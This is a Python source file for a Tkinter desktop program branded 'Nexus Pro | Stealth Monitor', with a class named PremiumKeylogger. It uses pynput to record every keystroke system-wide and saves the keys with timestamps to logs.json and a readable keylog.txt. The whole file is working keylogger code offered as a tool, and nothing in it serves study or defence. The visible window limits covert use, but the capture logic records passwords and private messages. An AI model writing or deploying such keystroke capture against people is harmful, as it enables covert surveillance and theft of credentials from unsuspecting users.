import tkinter as tk
from tkinter import messagebox, scrolledtext
from pynput import keyboard
import json
import threading
from datetime import datetime

class PremiumKeylogger:
    def __init__(self, root):
        self.root = root
        self.root.title("Nexus Pro | Stealth Monitor")
        self.root.geometry("600x650")
        self.root.configure(bg="#0F0F13") 
        self.root.resizable(False, False)

        # File Configuration
        self.json_file = "logs.json"
        self.text_file = "keylog.txt"

        # Logic States
        self.key_list = []
        self.is_pressed = False
        self.listener = None
        self.running = False

        # --- UI ELEMENTS ---
        self.top_bar = tk.Frame(root, bg="#1A1A22", height=60)
        self.top_bar.pack(fill="x")
        self.top_bar.pack_propagate(False)

        self.title_label = tk.Label(self.top_bar, text="NEXUS PRO", bg="#1A1A22", fg="#00F2FF", font=("Terminal", 18, "bold"), padx=20)
        self.title_label.pack(side="left")

        self.status_dot = tk.Label(self.top_bar, text="● SYSTEM IDLE", bg="#1A1A22", fg="#FF3E3E", font=("Segoe UI", 9, "bold"), padx=20)
        self.status_dot.pack(side="right")

        self.main_frame = tk.Frame(root, bg="#0F0F13", padx=30, pady=20)
        self.main_frame.pack(fill="both", expand=True)

        tk.Label(self.main_frame, text="LIVE DATA STREAM", bg="#0F0F13", fg="#555566", font=("Segoe UI", 8, "bold")).pack(anchor="w", pady=(0, 5))

        self.log_display = scrolledtext.ScrolledText(self.main_frame, width=60, height=18, bg="#16161E", fg="#A0A0B8", font=("Consolas", 10), borderwidth=0, highlightthickness=1, highlightbackground="#2A2A35", padx=15, pady=15)
        self.log_display.pack()
        self.log_display.insert(tk.END, ">> Initialized. Click START to begin logging...\n")
        self.log_display.config(state="disabled")

        self.button_container = tk.Frame(self.main_frame, bg="#0F0F13", pady=25)
        self.button_container.pack(fill="x")

        self.start_btn = tk.Button(self.button_container, text="START MONITOR", command=self.start_logging, bg="#00F2FF", fg="#0F0F13", font=("Segoe UI", 10, "bold"), relief="flat", height=2, width=22)
        self.start_btn.grid(row=0, column=0, padx=5)

        self.stop_btn = tk.Button(self.button_container, text="STOP & SAVE", command=self.stop_logging, bg="#2A2A35", fg="#888899", font=("Segoe UI", 10, "bold"), relief="flat", height=2, width=22, state="disabled")
        self.stop_btn.grid(row=0, column=1, padx=5)

    # --- LOGGING LOGIC ---

    def log_to_ui(self, message):
        self.log_display.config(state="normal")
        time_stamp = datetime.now().strftime('%H:%M:%S')
        self.log_display.insert(tk.END, f"[{time_stamp}] {message}\n")
        self.log_display.see(tk.END)
        self.log_display.config(state="disabled")

    def update_storage(self, key_str, is_initial_press):
        # 1. Update JSON (Detailed Data)
        self.key_list.append({
            'timestamp': str(datetime.now()),
            'key': key_str,
            'action': 'Pressed' if is_initial_press else 'Held'
        })
        with open(self.json_file, 'w') as f:
            json.dump(self.key_list, f, indent=4)

        # 2. Update Plain Text (Readable Format)
        if is_initial_press:
            with open(self.text_file, "a") as f:
                # Format special keys for readability
                if key_str == "Key.space":
                    f.write(" ")
                elif key_str == "Key.enter":
                    f.write("\n")
                elif key_str == "Key.tab":
                    f.write("\t")
                elif "Key" in key_str:
                    f.write(f" [{key_str}] ")
                else:
                    f.write(key_str)

    def on_press(self, key):
        key_str = str(key).replace("'", "")
        if not self.is_pressed:
            self.log_to_ui(f"KEY: {key_str}")
            self.update_storage(key_str, True)
            self.is_pressed = True
        else:
            self.update_storage(key_str, False)

    def on_release(self, key):
        self.is_pressed = False

    def start_logging(self):
        self.running = True
        self.status_dot.config(text="● SYSTEM ACTIVE", fg="#00FF41")
        self.start_btn.config(state="disabled", bg="#1A1A22", fg="#444455")
        self.stop_btn.config(state="normal", bg="#FF3E3E", fg="white")
        
        # Add a session header to the text file
        with open(self.text_file, "a") as f:
            f.write(f"\n\n--- SESSION START: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
            
        self.log_to_ui("MONITORING START...")
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop_logging(self):
        self.running = False
        self.status_dot.config(text="● SYSTEM IDLE", fg="#FF3E3E")
        self.start_btn.config(state="normal", bg="#00F2FF", fg="#0F0F13")
        self.stop_btn.config(state="disabled", bg="#2A2A35", fg="#888899")
        
        if self.listener:
            self.listener.stop()
        
        self.log_to_ui("LOGS SECURED AND SAVED.")
        messagebox.showinfo("Nexus Pro", f"Success!\n1. JSON Data -> {self.json_file}\n2. Readble TXT -> {self.text_file}")

if __name__ == "__main__":
    root = tk.Tk()
    app = PremiumKeylogger(root)
    root.mainloop()
